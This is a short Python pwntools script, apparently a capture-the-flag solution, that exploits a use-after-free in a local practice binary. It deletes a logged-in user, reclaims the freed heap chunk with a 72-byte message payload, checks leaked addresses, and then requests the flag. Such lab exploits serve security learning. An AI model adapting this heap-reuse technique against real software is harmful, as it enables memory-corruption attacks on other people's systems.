from pwn import *

target = "use-after-free"

while True:
    p = process(target)

    payload = b'\x01'*72
    p.recvuntil(">>>")
    p.sendline("login")
    p.recvuntil(':')
    p.sendline("Kim")
    p.recvuntil(':')
    p.sendline("1234")
    p.recvuntil(">>>")
    p.sendline("delete-user")
    p.recvuntil(':')
    p.sendline("Kim")
    del_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
    p.sendline("msg")
    print(p.recvuntil(":"))
    p.sendline(payload)
    msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
    if (int(del_addr, 16) - 0x60) != int(msg_addr, 16):
        continue
    p.sendline("get-flag")
    print(p.recvuntil(">>>"))
    break
